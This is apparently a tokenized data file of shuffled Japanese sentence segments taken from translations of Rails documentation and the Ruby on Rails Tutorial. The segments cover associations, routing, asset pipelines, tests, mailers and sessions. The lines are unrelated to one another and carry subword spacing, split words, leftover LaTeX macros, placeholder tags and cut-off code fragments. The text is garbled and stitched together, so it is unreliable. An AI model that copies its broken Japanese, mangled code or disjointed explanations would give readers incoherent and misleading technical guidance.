▁test ディレクトリ の下に は ` test / integration ` ディレクトリ があります ▟ ここに は エンジンの 結合テスト が置かれます 。
▁production 環境では 、 アセット ファイル名 に M D 5 フィンガープリント を挿入 し 、 アセット ファイルが Web ブラウザで キャッシュ される ようにしています 。
▁また 、` deep _ stringify _ keys ` や ` deep _ stringify _ keys !` を使用して 、 与えられた ハッシュの すべての キーを 文字列 化 し 、 その中に ネスト されている すべての ハッシュの キー も 文字列 化 することもできます 。
▁email 属性を 小文字 に変換 して メールアドレス の 一意性 を 保 証 する
▁{0} 図 12 ▖9{/0} ▁{1} Relationship モデルの カラム を 入 れ 替 え て 作 った 、 フォロワー の モデル {/1}
▁belongs _ to ▁ 関連付けの 図 ]( images / belongs _ to ▖ png )
▁たとえば 、 現在 が 20 10 年 2 月 の 最後の 日 で 、 そこ から 1 か 月 と 1 日 先に 進 め たい とします 。
▁ description : ▁email ▖ subject
▁また 、 クラウド IDE の テキストエディタ では 、 Ruby ▁on ▁Rails の 大きな プロジェクト には 不可 欠 とも 言 う べ き グローバル ファイル 検索 も 利用できます
▁#### ▁image _ tag
▁ これを行うには 、\ k ode { microposts } テーブルの \ k ode { in _ reply _ to } カラム と 、 追加 の \ k ode { including _ replies } スコープ を Micropost モデル に追加する 必要がある と お も います
▁== ▁Create Microposts : ▁migrat ed ▁(0▖00 2 6 s ) ▁============= =========
▁# ▁=> ▁#< Client ▁id : ▁10 , ▁first _ name : ▁" Ryan ">
▁ 以下のように 、 数値 を 人 間 にとって 読みやすい バ イ ト 数 形式 の 文字列に変換 できます 。
▁ ご想像 のとおり 、 ス ケ ー リ ング の 話 題 ▁( プロ フ ァ イ リ ング 、 キャッシュ 、 バ ッ ク グ ラ ウ ンド ジョブ など ) ▁ は RailsCasts でも た び た び 取り上げ ら れ ています 。
▁詳細については ▁[ アセットパイプライン ]( asset _ pipeline ▖ html ) ▁ ガイド を参照してください 。
▁\ k ode { authenticated ?} に 該 当 の パラメータを 渡す 代わりに 、 上の ようにします 。
▁### ▁Access
▁ タイトル に ERB コード を使用した Home ページのビュー ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁< li > <%= ▁ msg ▁%></ li >
▁\ k ode { uglifier } のバージョン が \ k ode { 1 ▖ 3▖0 } 以上 であれば 最新 バージョンの gem が インストール されます ▟ ▁ 極 端 に 言 えば バージョン が \ k ode { 7▖2 } であっても それが 最新 なら インストール されます ▟ なお 、 uglifier は Asset ▁Pipeline で ファイル 圧縮 を行う ためのものです 。
▁* ▁ アセット の 変更を 伴 わ ない デプロイ が 頻繁に 発生 する 。
▁ ロック は 、 データベースの レコード を更新する 際の 競 合 状態 を 避 け 、 ア ト ミ ッ ク な ▁( = 中 途 半 端 な 状態 の ない ) ▁ 更新 を行なう ために 有用です 。
▁validates ▁: title , ▁length : ▁ { ▁is : ▁5 ▁ }, ▁allow _ blank : ▁true
▁また 、 マイクロポストの ページネーション をテストするために は 、 マイクロポスト 用の fixture に いくつか テスト データ を追加する 必要があります が 、 これはリスト \ ref { code : users _ fixtures _ extra _ users } で ユーザー を追加した ときと同様 に 、 埋め込み Ruby を使うと 簡単です 。
▁ 目標は 、 正しく ない ユーザー登録 情報 と 正しい ユーザー登録 情報 を与え たときに 、 期待どおり に 動作する ことを確認する テスト の作成 です 。
▁* ▁ 行 末 に スペース を 置 か ないこと 。
▁User オブジェクト に \ k ode { password _ digest } カラム がある ことを確認する テスト 。
▁| ▁| ▁4 28 ▁| ▁: pre condition _ require d ▁|
▁この エラーを 発生 する 以下のコード を例にとって 説明 しましょう 。
▁ 後に 作成する サンプルアプリケーション と同様 、 デモアプリケーション は 、\ emph { ユーザー } と 、 それ に 関連 している \ emph { マイクロポスト } から 成り立 っています 。
▁$ ▁git ▁remote ▁add ▁ JohnSmith ▁git :// github ▖ com / JohnSmith / rails ▖ git
▁その 結果 、
▁Rails ルーター の 目的
▁この章では 、 アプリケーションの レイアウト を 形 に し 、 ルーティング を 洗 練 させ ました 。
▁match ▁' photos ', ▁to : ▁' photos # show ', ▁via : ▁ [: get , ▁: post ]
▁m ▁= ▁Object ▖ send (: remove _ const , ▁: M )
▁@ comment ▁= ▁@ article ▖ comments ▖ create ( comment _ params )
▁ユーザー を更新する アクション
▁ プロファイル ページ ヘ のリンク の表示
▁ 記憶トークン が 一意 に 保 た れる ことで 、 攻撃者は ユーザー ID と 記憶トークン を \ emph { 両方 とも } 奪 い 取ること に 成功 し ない限り セッションを ハイジャック でき なくなります 。
▁ 各 マイクロポストの 表示 には 、 3 つの どの 場合にも 、 それ が作成され て からの 時間 ▁( " 1 分 ​​ 前に 投 稿 " ▁ など ) ▁ が表示され ていることに注目してください ▟ これはリスト { p 0} の {2} time _ ago _ in _ words {/2} メソッド による ものです 。
▁To ▁get ▁help ▁on ▁this ▁sample ▁app , ▁see ▁the
▁### ▁ データベース を設定する
▁# ▁=> ▁ Token Generation E xception : ▁ トークン は 空欄 に できません
▁この キャッシュ は メソッド 間 でも 共有 される ことに注意してください 。
▁token , ▁options ▁= ▁token _ and _ options ( controller ▖ request )
▁# ▁以上で 、 production 環境では production _ low _ priority という キュー で ジョブ が
▁上のコードでは String の \ k ode { upcase } メソッド を使っています ▁(\ ref { sec : block s }) 。
▁ マイグレーション
▁ここまで で 、 CRUD のうち C と R を 実現 しました 。
▁\ k ode { admin } 属性 に対するテスト 。
▁たとえば 、 {0}{1} 図 1 ▖ 5 {/1}{/0} を もう一度 見 てみると 、 コードを 80 文字 以下 に 抑 え るため の 小さな 縦 線 が 右 側 に見えます 。
▁( リスト { p 0} から {2} authenticated ? {/2} の 式 を削除する と リスト \ ref { code : persistent _ sessions _ test } の 2 番目の テストが 失敗する ことも 確 認 できます ▟ つまり この テストが 正しい もの である ということです ) 。
▁# ▁ surname インスタンス reader も surname = ▁ インスタンス writer も 生成 されない
▁class ▁P la y er ▁< ▁ActiveRecord :: Base
▁\ k ode {@ } ▁ 記 号 によって 示 されている とおり 、\ k ode {@ name } と \ k ode {@ email } は 両方 とも インスタンス変数 なので 、 自動的に \ k ode { formatted _ email } メソッドで 使える ようになります 。
▁# ▁このコードは 準備 段階で す ▟ ╼ ▁#
▁" B e t el ge use !"
▁たとえば 、( 実は 本書 の 第 1 版 や 第 2 版 でも 間 違 って いた のですが ) ▁\ href { https :// github ▖ com / rails / rails / blo b / master / active model / lib / active _ model / secure _ password ▖ rb } { has \_ secure \_ password } の \ k ode { ソースコード } でも この 手 の 間 違い があります 。
▁これ に限ら ず 、 リファクタリング を行う 場合には 、 アプリケーションの コード を変更する 前 と 後で 必ず テスト を実行し 、 いずれも ▁\ passing \ ▁になることを確認 するようにしてください 。
▁C ▖ x ▁= ▁: c
▁* ▁` config ▖ action _ controller ▖ asset _ host ` は アセットを 置く ための ホスト を設定します 。
▁ 長い パス を 毎 回 表 記 すると 読み づ ら くなる ので 、 本書 では 以下のような ディレクトリ パス を参照 する 場合 、
▁もちろん 、 逆 リレーションシップ のために わざわざ データベース テーブル を 1 つ 余 分 に 作成する ような ことは しません 。
▁ オブジェクトを ` belongs _ to ` 関連付け に 割り当て ても 、 そのオブジェクト が自動的に 保存 される わけで は _ ありません _ 。
▁# ▁ デフォルトで オン になっています 。
▁ フレンドリーフォワーディング のテスト
▁ フ ッ タ パーシャル は 、 スタイルシート や ヘッダー パーシャル のとき と同じ 方法で レイアウト 中に 追加 できます ▁( リスト \ ref { code : layout _ with _ footer }) 。
▁` has _ one ` という リレーション は 、 主 語 となる もの が 目的 語 となる もの を 「 所有 している 」 ということ を表し ています ▟ そして 、 所有 されている 側 ( 目的 語 ) の方が 、 所有 している 側 ( 主 語 ) を 指 し 示 している という ことも 表 しています 。
▁#### ▁` append `
▁signup ページ への テストは 演習 に 回 す ことにします ▁(\ ref { sec : layout _ exercises }) 。
▁ 関連付け の詳細については 、 本ガイド の 次の 節 で説明します 。
▁Microposts リソース が提供する リスト \ ref { code : demo _ microposts _ resource } の RESTful ルート
▁create ▁app / helpers / users _ helper ▖ rb
▁ 永 続 セッション から ログアウト する
▁if ▁@ supplier ▖ account ▖ nil ?
▁ 記 述 を 簡 素 化 する ため 、 本書 で 以後 \ k ode { subl } と 書かれてい る 箇所 は お 好 み の エディタ に 読み 替 え てください 。
▁" Admin :: Session "▖ foreign _ key ▁# ▁=> ▁" session _ id "
▁The ▁ max ▁ po ol ▁size ▁is ▁current ly ▁5 ; ▁consider ▁increasing ▁it :
▁ パスワード再設定の テンプレート ▁( HTML メール )
▁ member ルーティング ブロック の 内 側 では 、 次に 述 べ る HTTP 動詞 が 指定された ルーティング 名を 認 識 できます 。
▁ 本番 Web サイト が動作する ために 、 設定ファイル の 変更を コミット して Heroku に プッシュ する必要があります 。
▁* ▁` before _ enqueue `
▁ 一度 画像 が アップロード され れば 、 Micropost パーシャル の \ k ode { image \_ tag } ヘルパー で その 画像 を 描画 できるようになります ▁( リスト \ ref { code : micropost _ partial _ image _ display }) 。
▁ これら を 手 軽 に 生成 するために 、 Rails の scaffold ジェネレータ を使用します 。
▁ 例 :
▁` collection _ singular _ id s ` メソッドは 、 その コレクション に含まれる オブジェクトの id を 配列 に したものを 返します 。
▁self を省略した 結果を リスト \ ref { code : destroy _ session } に示します 。
▁ それが 終わったら 、 ページ ごとに 異なる タイトル を表示する 、 ほんの 少しだけ 動的な コンテンツ を追加します 。
▁ これはリスト \ ref { code : relationships _ controller _ ajax } で使用されていました 。
▁以下の例 では customer が 宣言 されています 。
▁Object ▖ qualified _ const _ get (" Math :: P I ") ▁# ▁=> ▁3▖1 4 15 92 6 53 58 9 7 9 3
▁Client ▖ joins (' LE F T ▁ OUT ER ▁JOIN ▁addresses ▁ ON ▁addresses ▖ client _ id ▁= ▁clients ▖ id ')
▁Rails は 外部キー を 、 それに対応する シンボル から 推 測 します ▟ たとえば 、\ k ode { : follower } から \ k ode { follower _ id } を推測し 、\ k ode { : followed } から \ k ode { followed _ id } を 推 測 する という 具 合 です ▟ しかし 、 Follow ed モデル も Follow er モデル も 実際には ないので 、 クラス名 \ k ode { User } を提供 する必要があります 。
▁この 一見 不思議 な 手法 は 「\ emph { メ タ プログラミング }」 の最初の 例 になります ▟ メ タ プログラミング を 一 言 で言う と 「 プログラム で プログラム を作成する 」 ことです 。
▁ 名前空間化され た ` Application Helper ` ス タブ
▁" blorgh " の場合は マウント 可能な エンジン として 生成する ので 、 ターミナル で 以下のコマンドを実行し ます 。
▁`: json ` または `: hybrid ` シ リ ア ラ イ ザ を使用する場合 、 一部の Ruby オブジェクトが JSON として シリアライズ されない 可能性 がある ことにご注意ください ▟ たとえば 、` Date ` オブジェクト や ` Time ` オブジェクトは string s として シリアライズ され 、` Hash ` の キー は string に変換 されます 。
▁name : ▁[ ' John ', ▁' S er ge i ' ])
▁ 大量の 機能 を自動的に 生成する \ emph { scaffold } ジェネレータ という スクリプト を使って アプリケーションを す ば や く 生成 し 、 それ を元に 高度な Rails プログラミング と Web プログラミング の概要 を 学びます 。
▁# ▁` unscope ` する 前の オ リ ジ ナ ル の クエリ
▁C ▖ x ▁# ▁=> ▁: b
▁# ▁=> ▁< input ▁id =" pass " ▁name =" pass " ▁type =" password " ▁/>
▁ そして 以下の ステップ ファイル では 、 この テスト を実装 しています 。
▁" foo "▖ indent ( 2, ▁" \ t ") ▁# ▁=> ▁" \ t \ t foo "
▁user ▖ destroy
▁ これはリスト \ ref { code : add _ remember _ token _ to _ users } で使用されていました 。
▁bin stub s オプション
▁\ text tt { by ebug } を使って システム の状態 を 調 査 することは 、 アプリケーション 内の エラーを 追 跡 したり デバッグ するときに 非常に 強力な ツール になります 。
▁included ▁do
▁development 環境 の メール 設定
▁リスト \ ref { code : universal _ css } の CSS の 結果は 図 \ ref { fig : sample _ app _ universal } で 確 認 できます 。
▁\ href { http :// mb sy ▖ co / 6 V Q 8 l } { Code ▁School } : ▁ 非常に 多 種 多 様 な プログラミング を対話的に 学習 できる コース
▁# ▁=> ▁[ [ 0 ] , ▁[ - 5 ] , ▁[] , ▁[" foo ", ▁" bar " ]]
▁ これはリスト \ ref { code : rspec _ u til it ies _ simplified } で使用されていました 。
▁ nick ▖ new _ record ?
▁### ▁ ミドルウェアスタック を設定する
▁ 次 に進む前に 、 StaticPages コントローラ ファイルを Git リポジトリ に 追加 しておきましょう 。
▁=> ▁false
▁これで テストは ▁\ passing ▁ になるはずです 。
▁### ▁ アセットを プリコンパイル する
▁ その後 この リンク は Sprockets ▁gem によって 処理 されます 。
▁' Andy ' という名前の クライアント を探し 、 い なければ 作成した い とします 。
▁class ▁ Blacklist Constraint
▁` humanize ` メソッドは 、 属性 名を ▁( 英語 的に ) ▁ 読みやすい 表 記 に変換 します 。
▁### ▁ 関連付け の拡張
▁このコードは 、 フォローしている \ emph { すべての } ユーザーを メモリ ー から 一 気 に 取り出し 、 フォローしているユーザー の 完全な 配列 を 作り 出 します 。
▁これは 、\ k ode { rails ▁new } で生成された コードは シ ング ル ク オ ー テ ー ション を使っています が 、\ href { https :// github ▖ com / k er n / minitest - reporters } { minitest レ ポ ー ター の ドキュメント } では ダ ブ ル ク オ ー テ ー ション を使っている こと が原因で す 。
▁上のコード を実行する だけで 、( \ href { http :// api ▖ rubyonrails ▖ org / v 4▖0▖0 / classes / ActiveModel / Validations / Helper Methods ▖ html # method - i - validates _ confirmation _ of } { Rails ▁API } に記載されている ように ) ▁\ k ode { password _ confirmation } という 属性 が 作成されます 。
▁ 驚 いた ことに 、 Ruby では 組み込み の 基本 クラス の拡張 が 可能な のです ▟ Ruby ▁ の クラスは \ emph { オ ー プ ン } で 変更 可能 であり 、 クラス 設計 者 でない 開発者 でも これらの クラス に メソッドを 自由に 追加する ことが 許 されています
▁ アカウント有効化 メールの プレビュー ▁( テキスト バージョン )
▁たとえば 、\ k ode { : success } と \ k ode { : error } という ▁2 つの 状態 を持つ ▁\ k ode { flash } ▁ という名前の ハッシュ について 考えてみましょう 。
▁最初の パスワード テストを パス するよう にする 。
▁### ▁form _ tag
▁30 ▖ ▖ 50 ) ▁# ▁=> ▁false
▁この 要求 に 合 う モックアップ を 図 \ ref { fig : following _ mockup } ▁( フォローしているユーザー 用 ) ▁ および ▁図 \ ref { fig : followers _ mockup } ▁( フォロワー 用 ) ▁ に示します 。
▁以下の メソッドは ` active _ support / core _ ext / date _ time / calculations ▖ rb ` に のみ 実装 されています ▟ これらは ` DateTime ` インスタンス に対して 使用 しない と 意味 がない ためです 。
▁また 、\ k ode { s r c } 属性 には ▁" \ k ode { images } " ▁という ディレクトリ 名 が \ emph { 含まれていない } ことにも注目してください ▟ これは \ k ode { assets } ディレクトリ 内の 他の ディレクトリ ▁( images や javascripts 、 stylesheets など ) ▁ も同様です 。
▁email = michael %40 michael hartl ▖ com ╼ - --- == _ mime part _ 5407704 656 b 50 _ 6 1 d 3 fd 19 14 f 4 cd 02 99 6 a ╼ Content - Type : ▁text / html ; ╼ ▁ cha r set = UT F -8 ╼ Content - Transfer - Encoding : ▁7 bit ╼╼ < h 1> Sample ▁App </ h 1 >╼╼< p > H i ▁ Michael ▁Hartl , </ p >╼╼< p >╼ Welcome ▁to ▁the ▁ Sample ▁App !
▁以下の RSpec のコード で テスト できます 。
▁ デフォルト値 は ` true ` です 。
▁たとえば 、 以下 では 3 つの CSS ファイルを 結合 しています 。
▁ こう しておく と 見 過 ご し やすい エラーを 回 避 できる ので 、 デバッグ が 容易に なります 。
▁end
▁@ article ▁= ▁Article ▖ find ( params [: id ])
▁=> ▁" development "
▁` capitalize ` オプションを false に すると 、 冒 頭 の 文字 は 大文字 に されません ( デフォルト は true ) 。
▁t ▖ boolean ▁: s ing le _ issue
▁cookies を設定する と 、 以後 の ページのビュー で 以下のように して cookies から ユーザーを 取り 出 せる ようになります 。
▁4 行目 は 、\ k ode { checkout } コマンドを もっと 短い \ k ode { co } と 入力 できるように するための オプション 設定 です 。
▁StaticPages コントローラの デフォルトの テスト
▁これ に 渡される オプションは ` config ▖ action _ controller ▖ session _ options ` を使用して 設定 できます 。
▁ユーザー 入力 から 「 script 」 という文字 を 除 去 するのに 使用されている ブラックリスト があると しましょう 。
▁Rails ▁ のルーティング
▁=> ▁[ 42, ▁ 8, ▁17 , ▁6 , ▁7 ]
▁ アセットを 上 記 の 論 理 的な 場所 へ 配置 すれば 、\ emph { マニフェストファイル } を使用して 、 それら を どのように 1 つの ファイルに まとめ る のか を Rails に 指示 することができます ▟ なお 、 実際に まとめ る のは \ href { https :// github ▖ com / rails / sprockets } { Sprockets } ▁gem が 行います 。
▁Ruby ▁1▖9 の ` prev _ month ` メソッドと ` next _ month ` メソッドは 、 それぞれ 先 月 と 翌 月 の 同じ 日 を返します 。
▁> > ▁@ user
▁ マイクロポスト は 、 その 所有 � 者 ▁( ユーザー ) ▁ と 一 緒 に 破棄され ること を 保 証 する
▁( コントローラ 名 には 複数形 を使い 、 モデル名 には 単数形 を 用 い る という 慣習 を 頭 に 入 れ て おいてください ▟ コントローラは \ emph { Users } で モデル は \ emph { User } です ) 。
▁</ tr >
▁# ▁この モジュール は 孤 立 している が 、 まだ 無名 ではない
▁ { p 0} で説明した {2} or {/2} 演算子 {3} | | {/3} を使用すれば 、 以下のように 書く ことができます 。
▁ セキュリティ のための しく み が まったく ない
▁3 ▖ ▖ 7 ) ▁# ▁=> ▁true
▁Rails では 、 自動的に 上のコード を 変換 して 、 以下のような ユーザー プロフィール ページ への ルーティング します 。
▁{0} 図 2▖1 3 {/0} {1} マイクロポストの index ページ ▁(\ href { http :// localhost :3000/ microposts }{/ microposts })▟ \ href { http :// railstutorial ▖ org / images / figures / demo _ micropost _ index _ rails _ 3- full ▖ png }{( 拡大 ) }{/1}
▁* ▁` action _ mailer ▖ set _ config s `: ▁` config ▖ action _ mailer ` の設定 を使用して Action ▁Mailer を設定します ▟ 使用される ` config ▖ action _ mailer ` の設定 は 、 メソッド名 が ` ActiveRecord :: Base ` に対する セッター として ` send ` され 、 それ を経由して 値が 渡される ことによって 行われます 。
▁ 期限切れ のテスト 方法は さ ま ざ ま ですが 、 リスト \ ref { code : password _ reset _ expire _ test } で お す す め した 手法 ▁( 大文字 小文字 は 区別 されません ) ▁ を使えば 、 レスポンス の 本 文 に 「 expired 」 という 語 があるかどうかをチェック できます 。
▁* ▁` control s : ▁true ` は 、 ブラウザ が提供する 音 声 ファイル 制御 機能 を使用 できるようにします 。
▁ 以下のように 言い 換 え る 。
▁* ▁: through
▁ より 読みやすく した リスト \ ref { code : layout _ flash _ content _ tag } のコード に対して テストスイート を実行し 、 こちら も 正常に 動作する ことを確認してください ▟ このコード では 、 Rails の \ k ode { content _ tag } ヘルパー を使用しています 。
▁Rails では SQLite に代えて MySQL や PostgreSQL など を使用することもできます ▟ また 、 データベース接続 用の プラグイン が 多数 あります 。
▁3 ▖ ▖ 11 ) ▁# ▁=> ▁false
▁上の ヘルパーは 、 ファイルの アップロード に \ text tt { 5 ▖ me g abytes } などの 制限 を与える の に 便利です 。
▁ 特定の フィールド について 、 重複 の ない 一意 の 値を 1 レコード だけ 取り出し たい場合 、` distinct ` を使用できます 。
▁Rails は 、\ k ode { form _ for (@ user )} を使用して フォーム を構成する と 、\ k ode {@ user ▖ new _ record ?} が \ k ode { true } の ときには \ text tt { POST } を 、\ k ode { false } の ときには \ text tt { PATCH } を使用します 。
▁ いずれ の場合 も 、\ text tt { ● } という 演算子 がある ときの 「\ text tt { x ▁= ▁x ▁ ● ▁ y }」 と 「\ text tt { x ▁ ● = ▁ y }」 の動作 は 同じです 。
▁続いて 、 その モデル に対応する ` test _ unit ` ジェネレータ が呼び出され 、( ` test / models / article _ test ▖ rb ` ではなく ) ▁` test / models / blorgh / article _ test ▖ rb ` ▁ に モデル のテスト が置かれます ▁( ra the r ▁than ▁ )▟ フィクスチャ も同様に ▁( ` test / fixtures / articles ▖ yml ` ではなく ) ▁` test / fixtures / blorgh / articles ▖ yml ` に置かれ ます 。
▁Rails では 、 リソースフルな ヘルパー の 一般的な どの 部分 であっても 事 実 上 自由に カスタマイズ 可能です 。
▁### ▁ 要素 を加える
▁ マイグレーション の詳細については [ Active ▁Record マイグレーション ガイド ]( migrations ▖ html ) を参照してください 。
▁( Rails の ログ に エラー が出力されます が 、 害 は 生 じ ません 。
▁この節では 、 各 関連付け の詳細 を 解説します ▟ 関連付けの 宣言 によって 追加される メソッド や オプション についても 説明します 。
▁* ▁` config ▖ asset _ host ` は アセットを 置く ホスト を設定します 。
▁次に 、 図 \ ref { fig : failed _ login _ flash _ 3 r d _ edition } と 図 \ ref { fig : flash _ persistence _ 3 r d _ edition } の 手順を テストコード で 再 現 する必要があります 。
▁ 逆に 、 オブジェクトが 何 を \ emph { する } か を 説明 するのは 簡単です ▟ オブジェクト とは ▁( い つ い か なる 場合にも ) ▁ メッセージ に応答する ものです 。
▁d ▖ beginning _ of _ month ▁# ▁=> ▁S at , ▁01 ▁May ▁2010
▁create ▁app / views / static _ pages
▁* ▁` ActionDispatch :: SSL ` は すべての リクエスト に HTTP S プロトコル を 強 制 します 。
▁今度は コメント 作成 部分 も パーシャル に 追 い 出 してみましょう 。
▁NOTE : ▁ここで サポート されている 記 法 は 、` / ` で 区 切 る 「 ディレクトリ 式 」 のみ です 。
▁ 以下のコード を ` app / views / articles / new ▖ html ▖ erb ` に追加し て 、` form _ for ` メソッドを 使用できる ようにしましょう 。
▁< div >
▁* ▁` config ▖ action _ controller ▖ relative _ url _ root ` は 、[ サブディレクトリ への デプロイ ]( configuring ▖ html # サブディレクトリ にデプロイする - 相 対 url ルート の使用 ) を行う ことを Rails に 伝える ために 使用できます 。
▁ この時点で 以下 を実行すると 、 テストスイート が 赤色 ▁( 失敗 ) ▁ になるはずです 。
▁\ href { http :// michael hartl ▖ com /}{ マ イ ケ ル ハ ート ル ▁( Michael ▁Hartl )} ▁ は 、 「\ href { http :// ruby ▖ railstutorial ▖ org /}{ \ emph { Ruby ▁on ▁Rails ▁ チュートリアル } }」 という 、\ href { http :// rubyonrails ▖ org /}{ Ruby ▁on ▁Rails } ▁ を使って 初めて ▁Web ▁ アプリケーションを開発する 際に 最も よく 参 考 に される 本 の 著者 です 。
▁mail ▖ delivery _ method ▖ settings ▖ merge !(
▁デフォルトは ` nil ` であり 、 この場合 ` active _ support / all ` は 読み込まれます 。
▁ 同じ 変更を もっと 高速 かつ 素晴らしい 方法で 実装 する方法 を 思い 付ける か 。
▁ 関連付けられた レコード が存在し て はならない 場合 、 これ を検証する には `: inverse _ of ` オプションで その 関連付け を指定する 必要があります 。
▁4 3 , ▁ 44 , ▁ 45 , ▁4 6 , ▁4 7 , ▁ 48 , ▁4 9 , ▁50 , ▁ 51
▁* ▁`: nullify ` を指定すると 、 外部キー はすべて ` NULL ` に設定されます 。
▁< h 3 > Comments </ h 3 >
▁` camelize ` は ` c a me l case ` の別名 です 。
▁Rails コンソール は 素 晴 しい 学習 ツール であり 、 その 中 を 自由に 探 索 できます ▟ コンソール の中で 何 を し よう とも 、 何か を 壊 す ことは ▁( まず ) ▁ あり え ないので 、 ご 安 心 ください 。
▁ ╼ ▁end
▁* ▁` config ▖ action _ mailer ▖ raise _ delivery _ errors ` は 、 メールの 配信 が完了し なかった場合 に エラーを 発生 させる かどうかを指定します 。
▁ 実は 、\ k ode { bundle } コマンドは \ k ode { bundle ▁install } の エイリアス で もあります 。
▁ アカウント有効化 メイラー の HTML ビュー ▁( 自動生成 )
▁この ポスト は 、 宛 先 の ユーザーの フィード と 、 自分 を フォローしているユーザー に のみ 表示されます 。
▁ 集合 としては 任意の enumerable オブジェクトが 使用できます 。
▁- b ▁updating - users ╼\ end { code }╼╼ ▁\ subsection { 編集 フォーム } ▁% ▁( fold )╼ ▁\ label { sec : edit _ form }╼╼ We ▁start ▁with ▁the ▁edit ▁form , ▁who se ▁mockup ▁appears ▁in ▁Figure ~\ ref { fig : edit _ user _ mockup } ▖ \ foot note { Image ▁retrieved
▁ 大 規 模 な Web サイト では 、 バ ッ ク グ ラ ウ ンド ジョブ を使用して 、 フィード を 非同期 で 生成する などの 対策 が必要 でしょう ▟ Web サイトの ス ケ ー リ ング のような デ リ ケ ート な 問題 は 本書 の 範 疇 を 超 えます 。
▁<% ▁if ▁@ customer ▖ orders ▖ empty ?
▁ データベースに カラム を作成するとき 、 その カラム で レコードを \ emph { 検索 する ▁( find ) ▁ } 必要がある かどうかを 考え ること は 重要です 。
▁リスト \ ref { code : guard file } の ルール は 本チュートリアル に 最適化 した もの なので 、 たとえば コントローラの ファイル を変更する と 、 Guard は 即座に それを 検出 して 、 その コントローラの 統合テスト を 自動 実行 します 。
▁* ▁X - XSS - Pro t ec tion
▁この 実行 順序 には 意味 があります ▟ 極 端 な ケース では 、 順序 が 変わる と 計算 結果 も 異なる 場合 があります 。
▁これらの ヘルパーは 、 共通の バリデーション ルール を提供します 。
▁* ▁` config ▖ i 18 n ▖ load _ path ` は 、 ロケール ファイルの 探 索 パス を設定します 。
▁このヘルパーは 、 与えられた 集合 に 属性の値 が含まれ て 「 いない 」 こと を検証します 。
▁ 有効な ユーザー登録 に対するテスト ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁def ▁ welcome _ email ( user )
▁ ラ ジ オ ボタン を作成します ▟ ユーザーが 同じ オプション グループ 内 から 選択 できる よう 、 同じ name 属性 で ラ ジ オ ボタン を グループ 化 してください 。
▁* ▁` config ▖ active _ record ▖ primary _ key _ prefix _ type ` は 、 主キー カラム の 命 名 法 を変更 するのに 使用します 。
▁ queue _ as ▁: low _ priority
▁さらに 、 ユーザーが レ ビューの タイトル に 細 工 を して 、 悪意のある HTML を タイトル に含め れば 、 巨 大 な セキュリティホール になる こと すら あります 。
▁\ k ode { count : ▁ 0} という オプションを アサーション に追加する と 、 渡 した パターン に 一致する リンク が ゼロ になっている かどうかを確認 するよう \ k ode { assert \_ select } に 指示 します 。
▁| ▁GET ▁| ▁ / photos / : id / edit ▁| ▁photos # edit ▁| ▁ 写 真 編集 用の HTML フォーム を 1 つ 返す ▁|
▁\ k ode { name } 属性 の 存在性 を検証する
▁ 残 る 制 約 は 、 メールアドレスが 一意 であること を強制する こ だけ となり ました 。
▁作成した コードをリスト \ ref { code : signup _ form } に示します
▁この チュートリアル では ほとんどの 作業を ` app ` ディレクトリ で 行います が 、 Rails が 生成 した ファイル と フォルダ について ここで 簡単に 説明 しておきます 。
▁# ▁< message > K i ll ▁A Mo ▁ ob serv ing ▁wrap _ with _ notification s ▁since ▁A Re s ▁was ▁only ▁using ▁it </ message >
▁この モデル も 名前空間化され るので 、` Engine ` クラス 内の isolate _ namespace ` 呼び出し によって 、` app / models / article ▖ rb ` ではなく ` app / models / blorgh / article ▖ rb ` に置かれ ます 。
▁#### # ▁`: primary _ key `
▁Rails ▁4▖0 に アップグレード すると 、 ヘルパーは 読み 込 まれ た ディレクトリ の順序 を保持し 、 ソ ート は 各 ディレクトリ 内で のみ 行われます 。
▁ 変更 結果を リスト \ ref { code : home _ root _ route } に示します ▟ ここでは 、 リスト \ k ode { hello } の \ k ode { get } ▁ ルール を 以下のコード に置き換え ています 。
▁* ▁Rails ▁4▖0 の ` serialize d _ attributes ` メソッドと ` attr _ readonly ` メソッドは 、 クラスメソッド として のみ 使用する ように 変更 されました 。
▁ もっと 多 い 文字 数 の 投 稿 できる モデルに したい場合は ▁( たとえば 、 マイクロポスト ではなく 、 ブログ のような 投 稿 を 許可 したい場合は ) 、\ k ode { string } の代わりに \ k ode { text } を使うと よいでしょう 。
▁end ▖ bind ( object )
▁このメソッド には 破壊的な バージョンの ` String # squish !` もあります 。
▁Article ▖ where ( published : ▁true )▖ many ?
▁mail
▁ 設定 が 無 事 に 終わったら 、 これまで の 変更を コミット したり デプロイ する 準備が整いました 。
▁ そして 、 アプリケーション 側 のコードは 実装 済み なので 、 これらの テストは {0}{1}{/1}{1}{2} 成功 {/2} {/1}{1}{/1}{/0} するはずです 。
▁C ▖ x ▁# ▁=> ▁: a
▁ 条件 で使用する 数値 が 変 動 する 可能性 がある場合 、 引数 を どのように すれば よいでしょう か 。
▁{" file s ":{" application - 723 d 1 be 6 cc 7 4 1 a 3 a abb 1 ce c 242 76 d 6 8 1 ▖ js ":{" logical _ path ":" application ▖ js "," m time " : "2013-0 7-2 6 T 22 : 55 : 0 3- 07 :00 "," size " : 302 5 06 ,
▁ サンプルアプリケーションの 開発 では 、「 モックアップ 」「 テスト駆動開発 ▁( TDD ) 」「 統合テスト 」 の 3 つの 手法 を 採 り 入 れ ます ▟\ emph { } \ emph { } \ emph { }
▁特定の属性にアクセスするための 、 種類 が " date " の input タグを返します 。
▁さらに 、` cd ▁ ▖ ▖ ▁&& ▁rails ▁new ▁blog ▁-- database = mysql ` のように すると ジェネレータ を 繰り返し 実行 することもできます 。
▁ 以上の 説明 を元に 、 ダイジェスト トークン の 比 較 を User モデルの \ k ode { authenticated ?} メソッド の中に 置 け ば よい のではないかと 推 測 できます ▟ このメソッドは 、\ k ode { has _ secure _ password } で 提供され る ユーザー 認 証 用の \ k ode { authenticate } メソッド と似ています ▁( リスト \ ref { code : log _ in _ success }) 。
▁ 以前の Rails では データ の 更新 に HTTP の \ text tt { PUT } リクエスト を使用して いました が 、 HTTP 標準 に 従 えば \ text tt { PATCH } リクエスト の方が 適切 です 。
▁ では 、 ビュー は どのように 出力 される のでしょうか ▟ また 、 どの ビュー が表示される のでしょうか 。
▁{0} 図 9 ▖ 3 {/0} ▁{1} 更新 フォームの 送信 で 発生 した エラーメッセージ ▟ {/1}
▁format ▖ json _ patch ▁do
▁この sqlite 3 という gem のバージョン を指定する 主な 方法は 2 通り あります ▟ これにより 、 Rails で使用される gem のバージョン を 「 ある程度 」 制御 できます 。
